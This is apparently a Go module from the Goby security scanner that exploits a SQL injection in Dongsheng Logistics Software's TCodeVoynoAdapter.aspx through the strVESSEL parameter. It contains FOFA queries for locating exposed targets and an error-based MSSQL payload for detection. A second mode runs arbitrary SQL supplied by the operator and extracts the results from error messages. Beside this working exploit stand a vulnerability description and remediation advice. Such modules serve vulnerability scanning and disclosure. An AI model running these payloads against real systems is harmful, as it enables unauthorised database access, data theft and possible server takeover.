package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dongsheng Logistics Software TCodeVoynoAdapter.aspx SQL Injection Vulnerability",
    "Description": "<p>Dongsheng Logistics Software is a SOP dedicated to providing IT support for customers, helping customers greatly improve their work efficiency and reduce the potential risks of each link.</p><p>There is a SQL injection vulnerability at TCodeVoynoAdapter.aspx, the Dongsheng logistics software. An attacker can use this vulnerability to obtain sensitive database information.</p>",
    "Product": "Dongsheng Logistics Software",
    "Homepage": "http://www.dongshengsoft.com/",
    "DisclosureDate": "2023-02-20",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"CompanysAdapter.aspx\" || (body=\"dhtmlxcombo_whp.js\" && body=\"dhtmlxcommon.js\")",
    "GobyQuery": "body=\"CompanysAdapter.aspx\" || (body=\"dhtmlxcombo_whp.js\" && body=\"dhtmlxcommon.js\")",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Strictly filter the harmful parameters.</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "user",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "东胜物流软件 TCodeVoynoAdapter.aspx 文件 strVESSEL 参数 SQL注入漏洞",
            "Product": "东胜物流软件",
            "Description": "<p>东胜物流软件是一款致力于为客户提供IT支撑的 SOP， 帮助客户大幅提高工作效率，降低各个环节潜在风险的物流软件。<br></p><p>东胜物流软件 TCodeVoynoAdapter.aspx 处存在 SQL 注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。<br></p>",
            "Recommendation": "<p>1、对存在危害得参数进行严格过滤。</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dongsheng Logistics Software TCodeVoynoAdapter.aspx SQL Injection Vulnerability",
            "Product": "Dongsheng Logistics Software",
            "Description": "<p>Dongsheng Logistics Software is a SOP dedicated to providing IT support for customers, helping customers greatly improve their work efficiency and reduce the potential risks of each link.</p><p>There is a SQL injection vulnerability at TCodeVoynoAdapter.aspx, the Dongsheng logistics software. An attacker can use this vulnerability to obtain sensitive database information.</p>",
            "Recommendation": "<p>1. Strictly filter the harmful parameters.</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-08-30",
    "PocId": "10832"
}`
	sendPayloadfd1SIJGNsd6598 := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		uri := "/FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=" + url.QueryEscape(payload)
		getConfig := httpclient.NewGetRequestConfig(uri)
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadfd1SIJGNsd6598(hostInfo, `1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','1')),3,32)>0;--`)
			return resp != nil && strings.Contains(resp.Utf8Html, "nvarchar") && strings.Contains(resp.Utf8Html, "c4ca4238a0b923820dcc509a6f75849b")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			sql := goutils.B2S(ss.Params["sql"])
			//
			if attackType == "sql" {
				resp, err := sendPayloadfd1SIJGNsd6598(expResult.HostInfo, `1' and `+sql+` >0;--`)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "nvarchar") && strings.Contains(resp.Utf8Html, "System.Data.SqlClient.SqlException") {
					re := regexp.MustCompile(`'([^']*)'`)
					match := re.FindStringSubmatch(resp.Utf8Html)
					result := strings.Join(match[1:], "")
					expResult.Success = true
					expResult.Output = result
					return expResult
				}
			} else if attackType == "sqlPoint" {
				resp, _ := sendPayloadfd1SIJGNsd6598(expResult.HostInfo, `1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','1')),3,32)>0;--`)
				success := resp != nil && strings.Contains(resp.Utf8Html, "nvarchar") && strings.Contains(resp.Utf8Html, "c4ca4238a0b923820dcc509a6f75849b")
				if success {
					expResult.Output = `GET /FeeCodes/TCodeVoynoAdapter.aspx?mask=0&pos=0&strVESSEL=1%27+and+user+%3E0%3B-- HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close

`
				}
				expResult.Success = success
			}
			return expResult
		},
	))
}
